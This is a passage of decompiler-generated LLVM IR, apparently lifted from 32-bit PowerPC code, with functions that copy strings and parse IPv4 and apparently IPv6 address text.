  %v1_1000bb0c = add i32 %v0_1000bb0c, 1
  %v2_1000bb0c = inttoptr i32 %v1_1000bb0c to i8*
  %v3_1000bb0c = load i8, i8* %v2_1000bb0c, align 1
  %v0_1000bb10 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bb10 = add i32 %v0_1000bb10, 1
  store i32 %v1_1000bb10, i32* %r8.global-to-local, align 4
  %v0_1000bb14 = load i32, i32* %r7.global-to-local, align 4
  %v1_1000bb14 = add i32 %v0_1000bb14, 1
  store i32 %v1_1000bb14, i32* %r10.global-to-local, align 4
  %v1_1000bb18 = add i32 %v0_1000bb10, 2
  store i32 %v1_1000bb18, i32* %r9.global-to-local, align 4
  %v1_1000bb1c = add i32 %v0_1000bb14, 2
  store i32 %v1_1000bb1c, i32* %r12.global-to-local, align 4
  %v1_1000bb20 = add i32 %v0_1000bb10, 3
  store i32 %v1_1000bb20, i32* @r4, align 4
  %v3_1000bb24 = icmp eq i8 %v3_1000bb0c, 0
  store i1 %v3_1000bb24, i1* %cr7_eq.global-to-local, align 1
  %v4_1000bb28 = inttoptr i32 %v1_1000bb14 to i8*
  store i8 %v3_1000bb0c, i8* %v4_1000bb28, align 1
  %v0_1000bb2c = load i32, i32* @lr, align 4
  %v1_1000bb2c = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb2c, i32 %v0_1000bb2c)
  %v0_1000bb30 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bb30 = add i32 %v0_1000bb30, 1
  %v2_1000bb30 = inttoptr i32 %v1_1000bb30 to i8*
  %v3_1000bb30 = load i8, i8* %v2_1000bb30, align 1
  %v0_1000bb34 = load i32, i32* %r12.global-to-local, align 4
  %v1_1000bb34 = add i32 %v0_1000bb34, 1
  store i32 %v1_1000bb34, i32* %r11.global-to-local, align 4
  %v3_1000bb38 = icmp eq i8 %v3_1000bb30, 0
  store i1 %v3_1000bb38, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb3c = load i32, i32* %r10.global-to-local, align 4
  %v3_1000bb3c = add i32 %v2_1000bb3c, 1
  %v4_1000bb3c = inttoptr i32 %v3_1000bb3c to i8*
  store i8 %v3_1000bb30, i8* %v4_1000bb3c, align 1
  %v0_1000bb40 = load i32, i32* @lr, align 4
  %v1_1000bb40 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb40, i32 %v0_1000bb40)
  %v0_1000bb44 = load i32, i32* %r8.global-to-local, align 4
  %v1_1000bb44 = add i32 %v0_1000bb44, 1
  %v2_1000bb44 = inttoptr i32 %v1_1000bb44 to i8*
  %v3_1000bb44 = load i8, i8* %v2_1000bb44, align 1
  %v4_1000bb44 = zext i8 %v3_1000bb44 to i32
  store i32 %v4_1000bb44, i32* %r9.global-to-local, align 4
  %v3_1000bb48 = icmp eq i8 %v3_1000bb44, 0
  store i1 %v3_1000bb48, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb4c = load i32, i32* %r12.global-to-local, align 4
  %v3_1000bb4c = add i32 %v2_1000bb4c, 1
  %v4_1000bb4c = inttoptr i32 %v3_1000bb4c to i8*
  store i8 %v3_1000bb44, i8* %v4_1000bb4c, align 1
  %v0_1000bb50 = load i32, i32* @lr, align 4
  %v1_1000bb50 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb50, i32 %v0_1000bb50)
  %v0_1000bb54 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb54 = add i32 %v0_1000bb54, -1
  store i32 %v1_1000bb54, i32* %ctr.global-to-local, align 4
  %v2_1000bb54 = icmp eq i32 %v1_1000bb54, 0
  br i1 %v2_1000bb54, label %dec_label_pc_1000bb58, label %dec_label_pc_1000baf4.dec_label_pc_1000baf4_crit_edge

dec_label_pc_1000baf4.dec_label_pc_1000baf4_crit_edge: ; preds = %dec_label_pc_1000baf4
  %v0_1000baf8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000baf4

dec_label_pc_1000bb58:                            ; preds = %dec_label_pc_1000baf4
  %v0_1000bb58 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bb58 = urem i32 %v0_1000bb58, 4
  store i32 %v1_1000bb58, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bb7c

dec_label_pc_1000bb60:                            ; preds = %dec_label_pc_1000bb7c, %dec_label_pc_1000bb60.dec_label_pc_1000bb60_crit_edge
  %v0_1000bb64 = phi i32 [ %v0_1000bb64.pre, %dec_label_pc_1000bb60.dec_label_pc_1000bb60_crit_edge ], [ %v0_1000bb7c, %dec_label_pc_1000bb7c ]
  %v0_1000bb60 = load i32, i32* @r4, align 4
  %v1_1000bb60 = inttoptr i32 %v0_1000bb60 to i8*
  %v2_1000bb60 = load i8, i8* %v1_1000bb60, align 1
  %v3_1000bb60 = zext i8 %v2_1000bb60 to i32
  store i32 %v3_1000bb60, i32* %r9.global-to-local, align 4
  %v1_1000bb64 = add i32 %v0_1000bb64, -1
  store i32 %v1_1000bb64, i32* %r5.global-to-local, align 4
  %v1_1000bb68 = add i32 %v0_1000bb60, 1
  store i32 %v1_1000bb68, i32* @r4, align 4
  %v3_1000bb6c = icmp eq i8 %v2_1000bb60, 0
  store i1 %v3_1000bb6c, i1* %cr7_eq.global-to-local, align 1
  %v2_1000bb70 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bb70 = add i32 %v2_1000bb70, 1
  %v4_1000bb70 = inttoptr i32 %v3_1000bb70 to i8*
  store i8 %v2_1000bb60, i8* %v4_1000bb70, align 1
  store i32 %v3_1000bb70, i32* %r11.global-to-local, align 4
  %v0_1000bb74 = load i32, i32* @lr, align 4
  %v1_1000bb74 = load i1, i1* %cr7_eq.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 %v1_1000bb74, i32 %v0_1000bb74)
  %v0_1000bb84 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000bb84 = add i32 %v0_1000bb84, -1
  store i32 %v1_1000bb84, i32* %ctr.global-to-local, align 4
  %v2_1000bb84 = icmp eq i32 %v1_1000bb84, 0
  br i1 %v2_1000bb84, label %dec_label_pc_1000bb88, label %dec_label_pc_1000bb60.dec_label_pc_1000bb60_crit_edge

dec_label_pc_1000bb60.dec_label_pc_1000bb60_crit_edge: ; preds = %dec_label_pc_1000bb60
  %v0_1000bb64.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000bb60

dec_label_pc_1000bb7c:                            ; preds = %dec_label_pc_1000badc, %dec_label_pc_1000bb58
  %v0_1000bb7c = phi i32 [ %arg2, %dec_label_pc_1000badc ], [ %v1_1000bb58, %dec_label_pc_1000bb58 ]
  store i32 %v0_1000bb7c, i32* %ctr.global-to-local, align 4
  %v2_1000bb843 = icmp eq i32 %v0_1000bb7c, 0
  br i1 %v2_1000bb843, label %dec_label_pc_1000bb88, label %dec_label_pc_1000bb60

dec_label_pc_1000bb88:                            ; preds = %dec_label_pc_1000bb60, %dec_label_pc_1000bb7c
  %v0_1000bb88 = load i32, i32* %r9.global-to-local, align 4
  %v3_1000bb88 = icmp eq i32 %v0_1000bb88, 0
  store i1 %v3_1000bb88, i1* %cr7_eq.global-to-local, align 1
  %v0_1000bb8c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000bb88, i32 %v0_1000bb8c)
  %v0_1000bb90 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000bb90 = trunc i32 %v0_1000bb90 to i8
  %v2_1000bb90 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bb90 = add i32 %v2_1000bb90, 1
  %v4_1000bb90 = inttoptr i32 %v3_1000bb90 to i8*
  store i8 %v1_1000bb90, i8* %v4_1000bb90, align 1
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v0_1000bb7c, { 1, 2, 0 }
  uselistorder i32 %v1_1000bb84, { 1, 0 }
  uselistorder i32 %v1_1000bb58, { 1, 0 }
  uselistorder i32 %v1_1000bb54, { 1, 0 }
  uselistorder i32 %v1_1000bad0, { 1, 0 }
  uselistorder i32 %v0_1000bacc, { 0, 2, 1 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r9.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 4, 2, 3, 5, 0, 1 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5, 6, 7 }
  uselistorder i32* %ctr.global-to-local, { 5, 0, 4, 1, 2, 3 }
  uselistorder i32 %arg2, { 2, 0, 1, 3, 4 }
  uselistorder label %dec_label_pc_1000bb88, { 1, 0 }
  uselistorder label %dec_label_pc_1000bb7c, { 1, 0 }
}

define i32 @function_1000bb98(i8* %arg1) local_unnamed_addr {
dec_label_pc_1000bb98:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000bbc81 = load i32, i32* @r3, align 4
  %v1_1000bbc82 = inttoptr i32 %v0_1000bbc81 to i8*
  %v2_1000bbc83 = load i8, i8* %v1_1000bbc82, align 1
  %v3_1000bbcc6 = icmp eq i8 %v2_1000bbc83, 0
  br i1 %v3_1000bbcc6, label %dec_label_pc_1000bbdc, label %dec_label_pc_1000bbd4

dec_label_pc_1000bba4:                            ; preds = %dec_label_pc_1000bba4, %dec_label_pc_1000bbd4
  %v0_1000bba4 = phi i32 [ %v1_1000bba8, %dec_label_pc_1000bba4 ], [ %tmp, %dec_label_pc_1000bbd4 ]
  %v1_1000bba4 = inttoptr i32 %v0_1000bba4 to i8*
  %v2_1000bba4 = load i8, i8* %v1_1000bba4, align 1
  %v1_1000bba8 = add i32 %v0_1000bba4, 1
  %v3_1000bbac = icmp eq i8 %v2_1000bba4, 0
  %v4_1000bbb0 = icmp eq i8 %v0_1000bbb08.in, %v2_1000bba4
  %brmerge = or i1 %v3_1000bbac, %v4_1000bbb0
  br i1 %brmerge, label %dec_label_pc_1000bbb8, label %dec_label_pc_1000bba4

dec_label_pc_1000bbb8:                            ; preds = %dec_label_pc_1000bba4
  br i1 %v3_1000bbac, label %dec_label_pc_1000bbdc, label %dec_label_pc_1000bbc0

dec_label_pc_1000bbc0:                            ; preds = %dec_label_pc_1000bbb8
  %v1_1000bbc0 = add i32 %v0_1000bbc0, 1
  %v1_1000bbc4 = add i32 %v0_1000bbc4, 1
  %v1_1000bbc8 = inttoptr i32 %v1_1000bbc4 to i8*
  %v2_1000bbc8 = load i8, i8* %v1_1000bbc8, align 1
  %v3_1000bbcc = icmp eq i8 %v2_1000bbc8, 0
  br i1 %v3_1000bbcc, label %dec_label_pc_1000bbdc, label %dec_label_pc_1000bbd4

dec_label_pc_1000bbd4:                            ; preds = %dec_label_pc_1000bb98, %dec_label_pc_1000bbc0
  %v0_1000bbc4 = phi i32 [ %v1_1000bbc4, %dec_label_pc_1000bbc0 ], [ %v0_1000bbc81, %dec_label_pc_1000bb98 ]
  %v0_1000bbc0 = phi i32 [ %v1_1000bbc0, %dec_label_pc_1000bbc0 ], [ 0, %dec_label_pc_1000bb98 ]
  %v0_1000bbb08.in = phi i8 [ %v2_1000bbc8, %dec_label_pc_1000bbc0 ], [ %v2_1000bbc83, %dec_label_pc_1000bb98 ]
  br label %dec_label_pc_1000bba4

dec_label_pc_1000bbdc:                            ; preds = %dec_label_pc_1000bbc0, %dec_label_pc_1000bbb8, %dec_label_pc_1000bb98
  %v0_1000bbdc = phi i32 [ 0, %dec_label_pc_1000bb98 ], [ %v1_1000bbc0, %dec_label_pc_1000bbc0 ], [ %v0_1000bbc0, %dec_label_pc_1000bbb8 ]
  ret i32 %v0_1000bbdc

; uselistorder directives
  uselistorder i32 %v0_1000bba4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bbd4, { 1, 0 }
  uselistorder label %dec_label_pc_1000bba4, { 1, 0 }
}

define i32 @function_1000bbe4(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1000bbe4:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1000bbec = call i32 @__asm_mfcr()
  store i32 %v0_1000bbec, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1000bc00 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_1000bc00, i32* %r7.global-to-local, align 4
  store i32 0, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000bc64

dec_label_pc_1000bc14:                            ; preds = %dec_label_pc_1000bc64
  %v1_1000bc78 = add i32 %v0_1000bc74, -48
  %v2_1000bc7c = icmp ugt i32 %v1_1000bc78, 9
  br i1 %v2_1000bc7c, label %dec_label_pc_1000bc50, label %dec_label_pc_1000bc1c

dec_label_pc_1000bc1c:                            ; preds = %dec_label_pc_1000bc14
  %v0_1000bc1c = load i32, i32* %r7.global-to-local, align 4
  %v1_1000bc1c = inttoptr i32 %v0_1000bc1c to i8*
  %v2_1000bc1c = load i8, i8* %v1_1000bc1c, align 1
  %v3_1000bc1c = zext i8 %v2_1000bc1c to i32
  %v1_1000bc20 = mul nuw nsw i32 %v3_1000bc1c, 10
  %v2_1000bc24 = add i32 %v1_1000bc20, %v0_1000bc74
  %v1_1000bc28 = add i32 %v2_1000bc24, -48
  %v2_1000bc2c = icmp ugt i32 %v1_1000bc28, 255
  br i1 %v2_1000bc2c, label %dec_label_pc_1000bcac, label %dec_label_pc_1000bc34

dec_label_pc_1000bc34:                            ; preds = %dec_label_pc_1000bc1c
  %v1_1000bc34 = trunc i32 %v1_1000bc28 to i8
  store i8 %v1_1000bc34, i8* %v1_1000bc1c, align 1
  %v0_1000bc38 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_1000bc38, label %dec_label_pc_1000bc3c, label %dec_label_pc_1000bc64.backedge

dec_label_pc_1000bc3c:                            ; preds = %dec_label_pc_1000bc34
  %v0_1000bc3c = load i32, i32* %r10.global-to-local, align 4
  %v1_1000bc3c = add i32 %v0_1000bc3c, 1
  store i32 %v1_1000bc3c, i32* %r10.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  %v2_1000bc44 = icmp sgt i32 %v1_1000bc3c, 4
  br i1 %v2_1000bc44, label %dec_label_pc_1000bcac, label %dec_label_pc_1000bc64.backedge

dec_label_pc_1000bc50:                            ; preds = %dec_label_pc_1000bc14
  %v3_1000bc14 = icmp eq i32 %v0_1000bc88, 4
  store i32 0, i32* %r8.global-to-local, align 4
  %v3_1000bc80.not = icmp ne i32 %v0_1000bc74, 46
  %v0_1000bc58 = load i1, i1* %cr0_eq.global-to-local, align 1
  %brmerge = or i1 %v3_1000bc14, %v0_1000bc58
  %or.cond = or i1 %brmerge, %v3_1000bc80.not
  br i1 %or.cond, label %dec_label_pc_1000bcac, label %dec_label_pc_1000bc60

dec_label_pc_1000bc60:                            ; preds = %dec_label_pc_1000bc50
  %v0_1000bc60 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000bc60 = trunc i32 %v0_1000bc60 to i8
  %v2_1000bc60 = load i32, i32* %r7.global-to-local, align 4
  %v3_1000bc60 = add i32 %v2_1000bc60, 1
  %v4_1000bc60 = inttoptr i32 %v3_1000bc60 to i8*
  store i8 %v1_1000bc60, i8* %v4_1000bc60, align 1
  store i32 %v3_1000bc60, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1000bc64.backedge

dec_label_pc_1000bc64.backedge:                   ; preds = %dec_label_pc_1000bc60, %dec_label_pc_1000bc34, %dec_label_pc_1000bc3c
  %v0_1000bc64.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000bc68.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1000bc64

dec_label_pc_1000bc64:                            ; preds = %dec_label_pc_1000bc64.backedge, %dec_label_pc_1000bbe4
  %v0_1000bc68 = phi i32 [ %v0_1000bc68.pre, %dec_label_pc_1000bc64.backedge ], [ 0, %dec_label_pc_1000bbe4 ]
  %v0_1000bc6c = phi i32 [ %v0_1000bc64.pre, %dec_label_pc_1000bc64.backedge ], [ %v0_1000bbec, %dec_label_pc_1000bbe4 ]
  %v1_1000bc64 = inttoptr i32 %v0_1000bc6c to i8*
  %v2_1000bc64 = load i8, i8* %v1_1000bc64, align 1
  %v3_1000bc64 = zext i8 %v2_1000bc64 to i32
  store i32 %v3_1000bc64, i32* %r11.global-to-local, align 4
  %v1_1000bc68 = icmp slt i32 %v0_1000bc68, 0
  %v2_1000bc68 = icmp sgt i32 %v0_1000bc68, 0
  %v3_1000bc68 = icmp eq i32 %v0_1000bc68, 0
  store i1 %v3_1000bc68, i1* %cr0_eq.global-to-local, align 1
  %v1_1000bc6c = add i32 %v0_1000bc6c, 1
  store i32 %v1_1000bc6c, i32* %r3.global-to-local, align 4
  %v4_1000bc70 = call i4 @__asm_mcrf_cr0_read(i1 %v1_1000bc68, i1 %v2_1000bc68, i1 %v3_1000bc68, i1 false)
  %v0_1000bc74 = load i32, i32* %r11.global-to-local, align 4
  %v3_1000bc74 = icmp eq i32 %v0_1000bc74, 0
  %v0_1000bc88 = load i32, i32* %r10.global-to-local, align 4
  br i1 %v3_1000bc74, label %dec_label_pc_1000bc88, label %dec_label_pc_1000bc14

dec_label_pc_1000bc88:                            ; preds = %dec_label_pc_1000bc64
  %tmp9 = icmp slt i32 %v0_1000bc88, 4
  br i1 %tmp9, label %dec_label_pc_1000bcac, label %dec_label_pc_1000bc90

dec_label_pc_1000bc90:                            ; preds = %dec_label_pc_1000bc88
  store i32 %arg1, i32* @r3, align 4
  store i32 4, i32* @r5, align 4
  store i32 %v2_1000bc00, i32* @r4, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000bca0.328 to i32), i32* @lr, align 4
  %v0_1000bc9c = call i32 @function_10006d88()
  br label %dec_label_pc_1000bcac

dec_label_pc_1000bcac:                            ; preds = %dec_label_pc_1000bc50, %dec_label_pc_1000bc1c, %dec_label_pc_1000bc3c, %dec_label_pc_1000bc88, %dec_label_pc_1000bc90
  %storemerge = phi i32 [ 1, %dec_label_pc_1000bc90 ], [ 0, %dec_label_pc_1000bc88 ], [ 0, %dec_label_pc_1000bc3c ], [ 0, %dec_label_pc_1000bc1c ], [ 0, %dec_label_pc_1000bc50 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v1_1000bcbc = call %0 @__asm_mtcrf(i32 8, i32 %v0_1000bbec)
  %v4_1000bcbc = extractvalue %0 %v1_1000bcbc, 2
  store i1 %v4_1000bcbc, i1* %cr0_eq.global-to-local, align 1
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_1000bc74, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1000bc68, { 2, 1, 0 }
  uselistorder i32 %v0_1000bbec, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 0, 3, 2, 1 }
  uselistorder i32* %r10.global-to-local, { 2, 0, 1, 3 }
  uselistorder i1* %cr0_eq.global-to-local, { 0, 2, 1 }
  uselistorder i32 255, { 6, 7, 4, 5, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000bcac, { 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_1000bc64.backedge, { 0, 2, 1 }
}

define i32 @function_1000bcc4(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000bcc4:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_1000bcc8 = load i32, i32* @lr, align 4
  store i32 %v0_1000bcc8, i32* %r0.global-to-local, align 4
  %v3_1000bccc = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r29, align 4
  store i32 %arg3, i32* @r22, align 4
  br i1 %v3_1000bccc, label %dec_label_pc_1000bcf0, label %dec_label_pc_1000bce4

dec_label_pc_1000bce4:                            ; preds = %dec_label_pc_1000bcc4
  %v3_1000bce4 = icmp eq i32 %arg1, 10
  br i1 %v3_1000bce4, label %dec_label_pc_1000bd04, label %dec_label_pc_1000bea0

dec_label_pc_1000bcf0:                            ; preds = %dec_label_pc_1000bcc4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268483836, i32* @lr, align 4
  %v3_1000bcf8 = call i32 @function_1000bbe4(i32 %tmp, i32 %arg3)
  store i32 %v3_1000bcf8, i32* %r3.global-to-local, align 4
  store i32 %v3_1000bcf8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000beb8

dec_label_pc_1000bd04:                            ; preds = %dec_label_pc_1000bce4
  %v2_1000bd04 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000bd04, i32* %r3.global-to-local, align 4
  store i32 268483860, i32* @lr, align 4
  %v3_1000bd10 = call i32 @function_10006e24(i32 %v2_1000bd04, i32 0, i32 16)
  store i32 %v3_1000bd10, i32* %r3.global-to-local, align 4
  %v0_1000bd14 = load i32, i32* @r29, align 4
  %v1_1000bd14 = inttoptr i32 %v0_1000bd14 to i8*
  %v2_1000bd14 = load i8, i8* %v1_1000bd14, align 1
  %v3_1000bd14 = zext i8 %v2_1000bd14 to i32
  store i32 %v3_1000bd14, i32* %r0.global-to-local, align 4
  store i32 %v3_1000bd10, i32* @r31, align 4
  %v2_1000bd1c = add i32 %v3_1000bd10, 16
  store i32 %v2_1000bd1c, i32* @r27, align 4
  %v3_1000bd20 = icmp eq i8 %v2_1000bd14, 58
  br i1 %v3_1000bd20, label %dec_label_pc_1000bd28, label %dec_label_pc_1000bd34

dec_label_pc_1000bd28:                            ; preds = %dec_label_pc_1000bd04
  %v1_1000bd28 = add i32 %v0_1000bd14, 1
  %v2_1000bd28 = inttoptr i32 %v1_1000bd28 to i8*
  %v3_1000bd28 = load i8, i8* %v2_1000bd28, align 1
  %v4_1000bd28 = zext i8 %v3_1000bd28 to i32
  store i32 %v4_1000bd28, i32* %r0.global-to-local, align 4
  store i32 %v1_1000bd28, i32* @r29, align 4
  %v3_1000bd2c = icmp eq i8 %v3_1000bd28, 58
  br i1 %v3_1000bd2c, label %dec_label_pc_1000bd34, label %dec_label_pc_1000beb4

dec_label_pc_1000bd34:                            ; preds = %dec_label_pc_1000bd28, %dec_label_pc_1000bd04
  %v0_1000bd34 = phi i32 [ %v1_1000bd28, %dec_label_pc_1000bd28 ], [ %v0_1000bd14, %dec_label_pc_1000bd04 ]
  store i32 %v0_1000bd34, i32* @r26, align 4
  store i32 0, i32* @r24, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000be083036 = inttoptr i32 %v0_1000bd34 to i8*
  %v2_1000be083137 = load i8, i8* %v1_1000be083036, align 1
  %v3_1000be083238 = zext i8 %v2_1000be083137 to i32
  store i32 %v3_1000be083238, i32* %r3.global-to-local, align 4
  store i32 268484112, i32* @lr, align 4
  %v1_1000be0c3339 = call i32 @function_1000cab4(i32 %v3_1000be083238)
  store i32 %v1_1000be0c3339, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be0c3339, i32* @r30, align 4
  %v3_1000be103440 = icmp eq i32 %v1_1000be0c3339, 0
  br i1 %v3_1000be103440, label %dec_label_pc_1000be18, label %dec_label_pc_1000bd40.lr.ph

dec_label_pc_1000bd40:                            ; preds = %dec_label_pc_1000bd40.lr.ph, %dec_label_pc_1000be08.backedge
  %v1_1000be0c35 = phi i32 [ %v1_1000be0c3341, %dec_label_pc_1000bd40.lr.ph ], [ %v1_1000be0c, %dec_label_pc_1000be08.backedge ]
  store i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f398.329 to i32), i32* @r25, align 4
  %v0_1000bd4c = load i32, i32* @r29, align 4
  %v1_1000bd4c = add i32 %v0_1000bd4c, 1
  store i32 %v1_1000bd4c, i32* @r29, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1000f398.329 to i32), i32* @r3, align 4
  store i32 268483928, i32* @lr, align 4
  %v3_1000bd54 = call i32 @function_1000cad4(i32 ptrtoint ([17 x i8]* @global_var_1000f398.329 to i32), i32 %v1_1000be0c35)
  store i32 %v3_1000bd54, i32* %r3.global-to-local, align 4
  %v3_1000bd58 = icmp eq i32 %v3_1000bd54, 0
  br i1 %v3_1000bd58, label %dec_label_pc_1000bd78, label %dec_label_pc_1000bd60

dec_label_pc_1000bd60:                            ; preds = %dec_label_pc_1000bd40
  %v0_1000bd60 = load i32, i32* @r25, align 4
  %v2_1000bd60 = sub i32 %v3_1000bd54, %v0_1000bd60
  store i32 %v2_1000bd60, i32* %r0.global-to-local, align 4
  %v0_1000bd64 = load i32, i32* @r28, align 4
  %v1_1000bd64 = mul i32 %v0_1000bd64, 16
  store i32 %v1_1000bd64, i32* %r9.global-to-local, align 4
  %v2_1000bd68 = or i32 %v1_1000bd64, %v2_1000bd60
  store i32 %v2_1000bd68, i32* @r28, align 4
  %tmp19 = icmp ult i32 %v2_1000bd68, 65536
  br i1 %tmp19, label %dec_label_pc_1000be04, label %dec_label_pc_1000beb4

dec_label_pc_1000bd78:                            ; preds = %dec_label_pc_1000bd40
  %v0_1000bd78 = load i32, i32* @r30, align 4
  %v3_1000bd78 = icmp eq i32 %v0_1000bd78, 58
  br i1 %v3_1000bd78, label %dec_label_pc_1000bd80, label %dec_label_pc_1000bdd4

dec_label_pc_1000bd80:                            ; preds = %dec_label_pc_1000bd78
  %v0_1000bd80 = load i32, i32* @r23, align 4
  %v3_1000bd80 = icmp eq i32 %v0_1000bd80, 0
  br i1 %v3_1000bd80, label %dec_label_pc_1000bd88, label %dec_label_pc_1000bd9c

dec_label_pc_1000bd88:                            ; preds = %dec_label_pc_1000bd80
  %v0_1000bd88 = load i32, i32* @r24, align 4
  %v3_1000bd88 = icmp eq i32 %v0_1000bd88, 0
  br i1 %v3_1000bd88, label %dec_label_pc_1000bd90, label %dec_label_pc_1000beb4

dec_label_pc_1000bd90:                            ; preds = %dec_label_pc_1000bd88
  %v0_1000bd90 = load i32, i32* @r31, align 4
  store i32 %v0_1000bd90, i32* @r24, align 4
  %v0_1000bd94 = load i32, i32* @r29, align 4
  store i32 %v0_1000bd94, i32* @r26, align 4
  br label %dec_label_pc_1000be08.backedge

dec_label_pc_1000bd9c:                            ; preds = %dec_label_pc_1000bd80
  %v0_1000bd9c = load i32, i32* @r29, align 4
  %v1_1000bd9c = inttoptr i32 %v0_1000bd9c to i8*
  %v2_1000bd9c = load i8, i8* %v1_1000bd9c, align 1
  %v3_1000bd9c = zext i8 %v2_1000bd9c to i32
  store i32 %v3_1000bd9c, i32* %r0.global-to-local, align 4
  %v3_1000bda0 = icmp eq i8 %v2_1000bd9c, 0
  br i1 %v3_1000bda0, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bda8

dec_label_pc_1000bda8:                            ; preds = %dec_label_pc_1000bd9c
  %v0_1000bda8 = load i32, i32* @r31, align 4
  %v1_1000bda8 = add i32 %v0_1000bda8, 2
  store i32 %v1_1000bda8, i32* %r0.global-to-local, align 4
  %v1_1000bdac = load i32, i32* @r27, align 4
  %v3_1000bdac = icmp ugt i32 %v1_1000bda8, %v1_1000bdac
  br i1 %v3_1000bdac, label %dec_label_pc_1000beb4, label %dec_label_pc_1000bdb4

dec_label_pc_1000bdb4:                            ; preds = %dec_label_pc_1000bda8
  %v0_1000bdb4 = load i32, i32* @r28, align 4
  %v1_1000bdb4 = udiv i32 %v0_1000bdb4, 256
  store i32 %v1_1000bdb4, i32* %r0.global-to-local, align 4
  %v1_1000bdb8 = trunc i32 %v0_1000bdb4 to i8
  %v3_1000bdb8 = add i32 %v0_1000bda8, 1
  %v4_1000bdb8 = inttoptr i32 %v3_1000bdb8 to i8*
  store i8 %v1_1000bdb8, i8* %v4_1000bdb8, align 1
  %v0_1000bdbc = load i32, i32* %r0.global-to-local, align 4
  %v1_1000bdbc = trunc i32 %v0_1000bdbc to i8
  %v2_1000bdbc = load i32, i32* @r31, align 4
  %v3_1000bdbc = inttoptr i32 %v2_1000bdbc to i8*
  store i8 %v1_1000bdbc, i8* %v3_1000bdbc, align 1
  %v0_1000bdc0 = load i32, i32* @r29, align 4
  store i32 %v0_1000bdc0, i32* @r26, align 4
  %v0_1000bdc4 = load i32, i32* @r31, align 4
  %v1_1000bdc4 = add i32 %v0_1000bdc4, 2
  store i32 %v1_1000bdc4, i32* @r31, align 4
  store i32 0, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v1_1000be0830 = inttoptr i32 %v0_1000bdc0 to i8*
  %v2_1000be0831 = load i8, i8* %v1_1000be0830, align 1
  %v3_1000be0832 = zext i8 %v2_1000be0831 to i32
  store i32 %v3_1000be0832, i32* %r3.global-to-local, align 4
  store i32 268484112, i32* @lr, align 4
  %v1_1000be0c33 = call i32 @function_1000cab4(i32 %v3_1000be0832)
  store i32 %v1_1000be0c33, i32* %r3.global-to-local, align 4
  store i32 %v1_1000be0c33, i32* @r30, align 4
  %v3_1000be1034 = icmp eq i32 %v1_1000be0c33, 0
